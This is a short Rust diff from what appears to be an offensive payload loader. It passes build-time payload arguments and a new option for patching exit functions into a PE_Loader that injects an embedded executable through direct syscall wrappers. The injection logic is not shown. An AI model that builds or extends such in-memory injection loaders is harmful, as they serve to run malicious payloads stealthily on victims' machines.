@@ -22,6 +22,7 @@ use crate::debug_info_msg;
 
 use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
 use crate::winapi::pe_loader::PE_Loader;
+use crate::winapi::pe_loader::PE_Options;
 
 
 #[allow(dead_code)]
@@ -30,7 +31,12 @@ pub fn do_load()
     let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
         let pe_bytes = get_pe();
         debug_success_msg!(format!("PE loaded, size = {}", pe_bytes.len()));
-        load(pe_bytes);
+        let args = String::from(env!("PAYLOAD_ARGUMENTS"));
+        debug_success_msg!(format!("args = {}", args));
+        let options = PE_Options {
+            patch_exit_functions: true
+        };
+        load(pe_bytes, args, options);
     });
     match result {
         Err(_) => debug_error_msg!(format!("An Error occured")),
@@ -50,13 +56,13 @@ fn get_pe() -> Vec<u8> {
     pe_bytes.to_vec()
 }
  
-fn load(pe_bytes: Vec<u8>) {
-    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
+fn load(pe_bytes: Vec<u8>, args: String, options: PE_Options) {
+    
 
     let ntdll = SyscallWrapper::new();
     debug_info_msg!("Loading ...");
 
-    let mut pe_loader = PE_Loader::new(ntdll);
+    let mut pe_loader = PE_Loader::new(ntdll, options);
     if !pe_loader.inject(pe_bytes, args) {
         debug_error_msg!("Failed to inject PE.");
         return;
